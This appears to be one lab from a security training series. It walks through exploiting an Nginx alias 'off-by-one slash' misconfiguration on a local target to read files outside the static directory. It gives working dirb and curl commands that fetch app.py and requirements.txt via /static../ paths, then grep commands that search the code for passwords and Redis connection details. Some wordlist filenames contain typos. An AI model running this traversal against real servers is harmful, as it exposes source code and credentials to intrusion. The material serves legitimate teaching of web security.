# Lab 03 - Path Traversal Discovery via Nginx Misconfiguration (discover source code)

## Objective

Exploit an Nginx "off-by-one slash" misconfiguration on the `/static` directory to discover path traversal vulnerabilities and access files outside the intended directory scope.

## Background

Path traversal vulnerabilities occur when an application allows access to files and directories outside of the intended scope. A common Nginx misconfiguration involves the `alias` directive when combined with location blocks that don't have trailing slashes.

**The Vulnerability Pattern:**

When Nginx is configured like this:
```nginx
location /static {
    alias /app/static/;
}
```

Notice the `/static` location lacks a trailing slash, but the alias path has one. This creates an "off-by-one slash" vulnerability.

**How it's exploited:**
- Request: `GET /static../`
- Nginx resolves: `/app/static/` + `..`
- Final path: `/app/static/..` = `/app/`
- Result: Access to the parent directory!

This lab will teach you to systematically discover and exploit this misconfiguration.

## Steps

### 1. Recall Your Directory Discoveries

From Lab 02, you should have discovered the `/static/` directory using `dirb` with `common.txt`. If you need to verify:

```bash
dirb http://localhost:8080 common.txt
```

Expected output should include:
```
==> DIRECTORY: http://localhost:8080/static/
```

### 2. Test for Nginx Off-by-One Slash Misconfiguration

Now test if the `/static` location is vulnerable to the off-by-one slash bugwith curl:

```bash
# Try accessing /static.. (note the two dots but NO slash after static)
curl -I http://localhost:8080/static..

```

**What to look for:**
- HTTP 200 response = Potentially vulnerable
- HTTP 404 response = Not vulnerable or different configuration
- HTTP 301/302 = Redirection (investigate where it redirects)

### 3. Test Path Traversal with dirb - Phase 1 (common.txt)

Use `dirb` to enumerate files accessible through the path traversal with the common wordlist:

```bash
dirb http://localhost:8080/static../ commont.txt
```

**Expected discoveries:**
```
+ http://localhost:8080/static../templates/index.html (CODE:200|SIZE:11081)
==> DIRECTORY: http://localhost:8080/static../resumes/
==> DIRECTORY: http://localhost:8080/static../templates/

```

Try the same dirb scan, but with the common-web-server.txt wordlist:

```bash
dirb http://localhost:8080/static../ common-web-sever.txt
```

**Expected discoveries:**
```
+ http://localhost:8080/static../app.py (CODE:200|SIZE:28028)
==> DIRECTORY: http://localhost:8080/static../resumes/
==> DIRECTORY: http://localhost:8080/static../templates/

```
* we found the source code file at app.py !!!

**Why this works:**
- `dirb` tests: `http://localhost:8080/static../app.py`
- Nginx resolves: `/app/static/../app.py` = `/app/app.py`
- Result: Application source code exposed!

### 4. Manually Verify the Path Traversal

Confirm the vulnerability manually by accessing the discovered files, using curl or your browser:

```bash
# Try to access app.py
curl http://localhost:8080/static../app.py

# Try to access requirements.txt
curl http://localhost:8080/static../requirements.txt
```

**If successful, you should see:**
- `app.py`: Python/Flask application source code
- `requirements.txt`: Python package dependencies

### 5. Download and Examine app.py (Flask Application)

Retrieve the main application file, and requirements.txt file:

```bash
# Download app.py
curl http://localhost:8080/static../app.py -o app.py
curl http://localhost:8080/static../requirements.txt -o requirements.txt

# View the contents
cat app.py
```

**What to look for in app.py:**
- **Import statements**: What frameworks and libraries are used?
- **Database connections**: Look for connection strings
- **Redis references**: Search for Redis-related code
- **Routes/endpoints**: What URLs does the app handle?
- **File upload handling**: How are uploads processed?
- **Security controls**: Authentication, validation, etc.

**Search for specific items:**
```bash
# Look for Redis container references
grep -i "redis" app.py

# Look for database credentials
grep -i "password" app.py

# Look for file paths
grep -i "upload" app.py
grep -i "resume" app.py
```

### 6. Examine the Redis Container Reference

In the Flask app.py file, you should find a Redis connection string:

```python

rpass = os.getenv("REDIS_PASSWORD")
rserver = os.getenv("REDIS_CONTAINER")

# Example from app.py:
redis_client = redis.Redis(
    host=rserver,
    port=6379,
    password=rpass,
    db=0
)
```

**Document these critical details:**
- **Redis host**: `rserver`(see where in the code this is set)
- ***ENV variable: REDIS_CONTAINER***
- **Redis port**: `6379`
- **Redis password**: `rpass`(see where in the code this is set)
- **Database number**: `0`

Notice that the redis server is referenced as a container. Maybe this is a Docker container setup? Let's see if there are docker files using our path traversal.

**Why this matters:**
- You now know Redis is being used
- You can potentially connect to Redis directly, if you find credentials
- This will be crucial for exploitation in later labs


---

[← Previous: Interrogate Server](lab-02-interrogate-server.md) | [Next: Extract Docker Files →](lab-04-extract-docker-files.md)


